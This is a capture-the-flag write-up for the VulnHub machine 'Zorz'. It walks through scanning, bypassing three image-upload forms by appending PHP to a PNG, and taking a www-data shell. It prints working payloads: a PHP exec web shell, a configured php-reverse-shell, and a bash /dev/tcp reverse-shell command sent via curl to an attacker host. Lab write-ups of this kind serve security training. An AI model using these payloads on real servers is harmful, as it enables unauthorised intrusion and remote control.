# Zorz VulnHub Challenge Writeup

## Overview

"Zorz" is a VulnHub machine that primarily focuses on web application vulnerabilities, specifically file upload bypasses. The challenge involves identifying multiple image upload forms, each with increasing restrictions, and bypassing them by embedding PHP code within a legitimate image. This leads to gaining an initial shell as the `www-data` user, followed by basic post-exploitation enumeration.

## Reconnaissance

### Network Scanning

I started by identifying the target machine on the network using `netdiscover`:

```shellscript
netdiscover -r 192.168.1.0/24
```

The target machine was identified at `192.168.1.17` with the MAC Address `08:00:27:56:14:4F` (PCS Systemtechnik GmbH / Oracle VirtualBox virtual NIC).

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions on the target:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.17 -p-
```

**Results:**

- **22/tcp**: `ssh` OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
- **80/tcp**: `http` Apache httpd 2.4.7 ((Ubuntu))


### Web Enumeration (Port 80)

I used `gobuster` to enumerate directories and files on the web server running on port 80, looking for common web application files and extensions:

```shellscript
gobuster dir -u http://192.168.1.17/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak,html
```

**Key findings from `gobuster`:**

- `/index.html` (Status: 200)
- `/index2.html` (Status: 200)
- `/javascript` (Status: 301)
- `/phpmyadmin` (Status: 301)
- `/uploads2` (Status: 301)
- `/server-status` (Status: 403)


A later `gobuster` scan with a larger wordlist also revealed `/uploads3` (Status: 301).

I then used `curl` to inspect the content of the main page:

```shellscript
curl http://192.168.1.17/
```

The `index.html` page presented a "ZorZ Image Uploader!" form that submits to `uploader.php` and a link to `index2.html`.

```html
<!DOCTYPE html><html><body><center><br><br><br><form action="uploader.php" method="post" enctype="multipart/form-data">        <b>ZorZ Image Uploader!:</b><br><br>        <input type="file" name="upfile" id="upfile"><br><br>        <input type="submit" value="Upload Image" name="submit"></form><br><a href="index2.html">Try ZorZ Image Uploader2!</a></center></body></html>
```

Navigating to `index2.html` revealed "ZorZ Image Uploader 2!" and links to "ZorZ Image Uploader 1" and "ZorZ Image Uploader 3". This clearly indicated multiple upload functionalities, likely with varying levels of security.

<img width="1047" height="483" alt="image" src="https://github.com/user-attachments/assets/4279074f-a87f-4360-923c-af33e3cddef0" />


## Initial Foothold (File Upload Vulnerabilities)

The primary goal was to upload a PHP web shell to gain remote code execution. I prepared a standard PHP reverse shell for this purpose.

### Preparing the PHP Web Shell

I copied a `php-reverse-shell.php` from my Kali machine and modified it to connect back to my attacking machine's IP (`192.168.1.5`) and port (`4444`).

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// ... (rest of the original script) ...
$ip = '192.168.1.5';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
// ... (rest of the original script) ...
?>
```

### Attempting Uploads and Bypasses

I proceeded to test the different upload forms, starting with the least restrictive and moving to more complex bypasses.

#### 1. Upload to `uploader.php`(via `index.html`)

I attempted to upload the `php-reverse-shell.php` directly through the form on `index.html` (which submits to `uploader.php`). This upload was successful, indicating minimal file type validation.

I confirmed its presence by browsing to the `/uploads1` directory:

```shellscript
curl http://192.168.1.17/uploads1/
```

**Output (showing the uploaded file):**

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html> <head>  <title>Index of /uploads1</title> </head> <body><h1>Index of /uploads1</h1>  <table>   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>   <tr><th colspan="5"><hr></th></tr><tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr><tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="php-reverse-shell.php">php-reverse-shell.php</a></td><td align="right">2025-07-14 16:44  </td><td align="right">5.4K</td><td>&nbsp;</td></tr>   <tr><th colspan="5"><hr></th></tr></table><address>Apache/2.4.7 (Ubuntu) Server at 192.168.1.17 Port 80</address></body></html>
```

The `php-reverse-shell.php` was accessible at `http://192.168.1.17/uploads1/php-reverse-shell.php`.

#### 2. Upload to `uploader2.php`(via `index2.html`)

Next, I tried to upload the `php-reverse-shell.php` directly to `uploader2.php` (accessed via `index2.html`). This resulted in an explicit error message: "File is not an image. Sorry, only JPG, JPEG, PNG & GIF files are allowed. Sorry, your file was not uploaded."

<img width="892" height="190" alt="image" src="https://github.com/user-attachments/assets/f35b86f4-6d04-4cd3-96e5-2359110316ca" />


To bypass this restriction, I used an image-based PHP shell technique: appending the PHP code to a legitimate PNG image. This makes the file appear as a valid image to the server's file type check, but still allows the PHP interpreter to execute the appended code if the file is accessed directly.

1. **Download a base PNG image:**( you can find this online )

2. **Append the PHP web shell code to the PNG:**
I used a simple `exec` shell for brevity, but the reverse shell could also be appended.

```shellscript
echo '<?php exec($_GET["cmd"]); ?>' >> base.png
```
<img width="830" height="204" alt="image" src="https://github.com/user-attachments/assets/e9f8eb68-d412-453a-8070-b2535885b346" />


3. **Rename the file to a PHP extension with an image extension:**

```shellscript
mv base.png shell.php.png
```




I then uploaded `shell.php.png` through the "ZorZ Image Uploader 2!" interface. The upload was successful.



#### 3. Upload to `uploader3.php`(via `index2.html`)

Based on the previous success, I attempted the same image-based PHP shell technique for the "ZorZ Image Uploader 3!". The terminal output confirmed that the same bypass method worked for this uploader as well.

### Gaining a Reverse Shell

I set up a `netcat` listener on my attacking machine (Kali Linux) on port 4444:

```shellscript
nc -lnvp 4444
```

Then, I triggered the reverse shell by navigating to the uploaded file's URL.

For the `uploads1` directory (where the direct PHP shell was uploaded):

```shellscript
curl http://192.168.1.17/uploads1/php-reverse-shell.php
```

For the `uploads2` or `uploads3` directories (where `shell.php.png` was uploaded):

```shellscript
curl 'http://192.168.1.17/uploads2/shell.php.png?cmd=/bin/bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.5/4444%200%3E%261%22'
```

<img width="1365" height="289" alt="image" src="https://github.com/user-attachments/assets/07204879-ea1a-4660-900a-38e73b2cd6ac" />


Upon accessing either URL, I received a reverse shell on my `netcat` listener as the `www-data` user:

```shellscript
Connection received on 192.168.1.17 34386
Linux zorz 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

I then upgraded to a proper TTY shell for better interaction:

```shellscript
python3 -c "import pty;pty.spawn('/bin/bash')"
```

## Post-Exploitation (as `www-data`)

### User Enumeration

I explored the `/home` directory to identify potential user accounts:

```shellscript
www-data@zorz:/$ cd /home
www-data@zorz:/home$ ls
user
```

I found one user directory: `user`. I navigated into it and attempted to find interesting files:

```shellscript
www-data@zorz:/home/user$ ls -la
# ... (output showing .bash_history, .mysql_history, .profile) ...
www-data@zorz:/home/user$ cat .mysql_history
cat: .mysql_history: Permission denied
```

I was unable to read `.mysql_history` due to permissions. The `.profile` file contained standard shell configurations.

### Privilege Escalation Attempts

I checked for `sudo` privileges for the `www-data` user, but it required a password, which I did not have.

```shellscript
www-data@zorz:/home/user$ sudo -l
[sudo] password for www-data: Sorry, try again.
```

I then searched for SUID binaries on the system to identify potential privilege escalation vectors:

```shellscript
find / -perm -4000 2> /dev/null
```

**Key SUID binaries found:**

- `/bin/mount`
- `/bin/fusermount`
- `/bin/ping`
- `/bin/umount`
- `/bin/ping6`
- `/bin/su`
- `/usr/sbin/uuidd`
- `/usr/sbin/pppd`
- `/usr/bin/gpasswd`
- `/usr/bin/passwd`
- `/usr/bin/mtr`
- `/usr/bin/chsh`
- `/usr/bin/chfn`
- `/usr/bin/newgrp`
- `/usr/bin/sudo`
- `/usr/bin/traceroute6.iputils`
- `/usr/lib/openssh/ssh-keysign`
- `/usr/lib/dbus-1.0/dbus-daemon-launch-helper`
- `/usr/lib/eject/dmcrypt-get-device`
- `/usr/lib/pt_chown`


While many SUID binaries were present, the provided logs did not show a successful privilege escalation to root. The primary objective of this phase of the challenge was to gain a shell via the file upload vulnerability. Further enumeration and exploit research would be required to achieve root access.

## Conclusion

The "Zorz" challenge was a straightforward exercise in web application exploitation, specifically focusing on bypassing file upload restrictions. By systematically testing different upload forms and leveraging the technique of embedding PHP code within a legitimate image file, I was able to gain an initial foothold as the `www-data` user. The challenge highlights the importance of robust file validation on web servers. Further steps would involve deeper enumeration and exploitation of SUID binaries or other misconfigurations to achieve full root access.

## Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `gobuster` - Directory and file enumeration
- `curl` - Web requests and triggering shells
- `php-reverse-shell.php` - PHP web shell
- `netcat` - Setting up listeners for reverse shells
- `python3` - Spawning TTY shells
- `ls`, `cd`, `cat`, `find` - Basic Linux commands for enumeration


---

SuggestionsClose suggestions[data-radix-scroll-area-viewport]{scrollbar-width:none;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;}[data-radix-scroll-area-viewport]::-webkit-scrollbar{display:none}Add IntegrationInvestigate SUID binaries for privilege escalationLook for cron jobs or writable scriptsExplore the 'user' home directory more deeplyAnalyze the `uploader.php` source codePractice different file upload bypass techniquesScroll leftScroll right
